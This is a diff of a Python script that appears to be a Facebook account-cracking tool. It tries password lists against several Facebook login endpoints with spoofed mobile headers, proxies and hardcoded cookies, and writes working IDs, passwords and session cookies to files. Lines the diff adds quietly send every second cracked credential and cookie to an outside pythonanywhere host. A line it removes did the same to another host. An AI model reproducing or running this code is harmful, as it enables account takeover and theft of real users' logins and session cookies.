+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://m.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://touch.facebook.com/login/device-based/login/async/'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
                     else:
-                        bkas.append(uid)
+                        bkas.append(cid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{coki}")
+                           statusok = (f"{cid}|{pw}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                           oks.append(uid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
                            break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
-    except net_error:
-        time.sleep(10)
-    except Exception as e:
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
         pass
 
+def freeq(uid,pwx,tl):
+    global oks
+    global cps
+    global twf
+    global loop
+    global bkas
+    sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.flush()
+    try:
+        for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
+            Session = requests.Session()
+            free_fb = Session.get('https://touch.facebook.com').text
+            data = {
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '2',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
+            'lgnrnd': '104423_iIof',
+            'lgnjs': '1733165065',
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': '',
+            'prefill_type': 'contact_point',
+            'first_prefill_source': '',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'false',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqV^%^2F^%^2FAVAAAAFAE',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf_7.AWVpDy9HdWE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sfau': 'AYiXwRf6w9LrJM3e68tRDNnP4n9ZudONoMXaOqwgSieQfSkQFBWuauURAUPbdvQU7iCjZGu-1CbA7V4XIDLCdK2eOktmo1ZD_6YIq1HvKK_W584XnARioXs2RjzLcb6lVxvl0kr60PEohZDH76VSXNFn17yVUX7-dkBbzlkOYk7RHaBonBXv5_nGh-xPvH_p5CisjaXz_41Q9fyr8sHPLfPTUjvh1MDdOG5SFgL7BXYwiZ2SzjvyFqYWSmobi7I3ed2QaSACCLJwNrY3fY5KKv4C',
+            'sfiu': 'AYhnD_pdzBJQEE86DsEw4mlSkyBkphy4P5A27esTyrVJBDejQiAdmH9t3Rc13UXt-scXkchI5aWrGAirxl60nddzWjnjYjfW9k53WNx69g4HWaSpFyGdOLuy7_G6eIiTubm32rGUWJouN1pGkJqOtblCc6PQo89kFpGt-zT7JsHdbsw5wOfPNKkAeuEI12mP4Tu9XPTUmd2nEn1XEbv2-fl4pYoLKonvLZ-7TbPeqw-S9cgugfIoH6-gtmvV0gvhRnFpHUVmgW8WNXN49ZixyN-9',}
+            headers = {
+            "Host": "web.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="131"',
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://web.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": 'https://web.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
+        pass
 
 def d(uid,pwx,tl):
     global oks
@@ -1813,46 +1786,110 @@ def d(uid,pwx,tl):
             ua = random.choice(uas)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
-            data ={
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            headers ={
-            'Host': 'm.facebook.com',
-            'method': 'POST',
-            'path': '/login/Device-based/login/async/',
-            'scheme': 'https',
-            'content-length': '294',
-            'Accept-Encoding': 'gzip',
-            'content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'dpr': '1.75',
-            'viewport-width': '980',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-full-version-list': '',
-            'sec-ch-prefers-color-scheme': 'light',
-            'upgrade-insecure-requests': '1',
-            'user-agent': ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'dnt': '1',
+            data = {
+    "params": json.dumps({
+        "server_params": {
+            "credential_type": "password",
+            "username_text_input_id": "yzmero:69",
+            "password_text_input_id": "yzmero:70",
+            "login_source": "Login",
+            "login_credential_type": "none",
+            "server_login_source": "login",
+            "ar_event_source": "login_home_page",
+            "should_trigger_override_login_success_action": 0,
+            "should_trigger_override_login_2fa_action": 0,
+            "is_caa_perf_enabled": 0,
+            "reg_flow_source": "login_home_native_integration_point",
+            "caller": "gslr",
+            "is_from_landing_page": 0,
+            "is_from_empty_password": 0,
+            "is_from_password_entry_page": 0,
+            "is_from_assistive_id": 0,
+            "is_from_msplit_fallback": 0,
+            "INTERNALlatency_qpl_marker_id": 36707139,
+            "INTERNALlatency_qpl_instance_id": "211568211600414",
+            "device_id": None,
+            "family_device_id": None,
+            "waterfall_id": "9b12f14d-e937-4714-94bf-015a5d6b4db3",
+            "offline_experiment_group": None,
+            "layered_homepage_experiment_group": None,
+            "is_platform_login": 0,
+            "is_from_logged_in_switcher": 0,
+            "is_from_logged_out": 0,
+            "access_flow_version": "F2_FLOW"
+        },
+        "client_input_params": {
+            "machine_id": "",
+            "contact_point": uid,
+            "password": "#PWD_BROWSER:0:{}:{}".format(str(int(time.time())), pw),
+            "accounts_list": [],
+            "fb_ig_device_id": [],
+            "secure_family_device_id": "",
+            "encrypted_msisdn": "",
+            "headers_infra_flow_id": "",
+            "try_num": 1,
+            "login_attempt_count": 1,
+            "event_flow": "login_manual",
+            "event_step": "home_page",
+            "openid_tokens": {},
+            "auth_secure_device_id": "",
+            "client_known_key_hash": "",
+            "has_whatsapp_installed": 0,
+            "sso_token_map_json_string": "",
+            "should_show_nested_nta_from_aymh": 0,
+            "password_contains_non_ascii": "false",
+            "has_granted_read_contacts_permissions": 0,
+            "has_granted_read_phone_permissions": 0,
+            "app_manager_id": "",
+            "lois_settings": {
+                "lois_token": "",
+                "lara_override": ""
+            }
+        }
+    })
+}
+            data2 = {
+            '__aaid': '0',
+            '__user': '0',
+            '__a': '1',
+            '__req': 'f',
+            '__hs': '20058.BP:wbloks_caa_pkg.2.0..0.0',
+            'dpr': '3',
+            '__ccg': 'EXCELLENT',
+            '__rev': '1018538768',
+            '__s': '3o19vx:6unffp:0ifzbp',
+            '__hsi': '7443521229922239744',
+            '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew2io0D24o1MUaE1Do1u81x82ewnE3Mw4WwSyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jw',
+            '__csr': '',
+            'fb_dtsg': 'NAcOlfpCOM2BFnghClV_Fbk2SejAMCvE1gYRFgP4Eh4s03fmjrbDwEA:0:0',
+            'jazoest': '24865',
+            'lsd': 'AVqsfW-tGqM',
+            'params': json.dumps(data),}
+            params = {
+            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
+            'type': 'action',
+            '__bkv': 'c56d64e112aab0b91c09738dea6c1b1ae292869302e280ba3309ee28c8454654',}
+            headers = {
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
             'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
-            'x-requested-with': 'mark.via.gp',
-            'sec-fetch-site': 'none',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'accept-encoding': 'gzip, deflate, br, zstd',
-            'accept-language': 'en-US,en;q=0.9',}
+            'referer': 'https://m.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMyOTk2OTY2LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23076PC4BI"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
-            po = Session.post(url, data=data, headers=headers).text
+            url = "https://mbasic.facebook.com/async/wbloks/fetch/"
+            po = Session.post(url, params=params, data=data2, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -2155,22 +2192,118 @@ def cracker(uid, pwx, tl):
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_sumon/txt={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
-                coki=";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                uid = "1000"+coki[0:11]
-                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
+        pass
+def mail(uid,pwx,first,tl):
+    global oks
+    global cps
+    global twf
+    global loop
+    global bkas
+    sys.stdout.write(f"\r {green}(BITHIKA) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.flush()
+    try:
+        for pw in pwx:
+            Session = requests.Session()
+            last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','khan','pal','ray',])
+            idff = first+last+uid
+            free_fb = Session.get('https://touch.facebook.com/').text
+            data = {
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '084225__vjZ',
+            'lgnjs': '1732639345',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTczMjYzOTM0NS44NDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3MzI2MzkzNDUuODQ2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3MzI2MzkzNDUuODQ3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3MzI2MzkzNDUuODQ3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tSU4iLCJlbi1VUyIsImVuLUdCIiwiZW4iLCJoaSIsImd1IiwiYm4iXX1dLCIzMDAwNCI6W3sidCI6MTczMjYzOTM0NS44NDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MTUwfV0sIjMwMDA1IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg0NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp7InciOjk5NSwiaCI6NzczfX1dLCIzMDAwNyI6W3sidCI6MTczMjYzOTM0NS44NDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzMyNjM5MzQ1Ljk0OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTczMjYzOTM0NS44NDksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTczMjYzOTM0NS44NDksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg0OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg0OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzMyNjM5MzQ1Ljg2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3MzI2MzkzNDUuODYxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3MzI2MzkzNDUuODYxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjB9XSwiMzAwOTQiOlt7InQiOjE3MzI2MzkzNDUuODYxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg2MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo2fV0sIjMwMTA2IjpbeyJ0IjoxNzMyNjM5MzQ1LjczLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfSx7InQiOjE3MzI2MzkzNDcuMjc2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3MzI2MzkzNDUuNzMxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfV19',
+            'email': idff,
+            'prefill_contact_point': idff,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAA/A//A//ABAAC',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': 'DQQ-Z3Sl1kkwp5eJPjAonnEo',
+            'sb': 'DQQ-Z2ztbMJmdxyVIlGZ0ZEN',
+            'wd': '995x773',
+            'fr': '0c3x4NhqzBoN0oJpn.AWU6FQl4Gq0s9t7zOA_rFuUfdVo.BnPBZf..AAA.0.0.BnRfpx.AWUaeu38LkE',}
+            headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
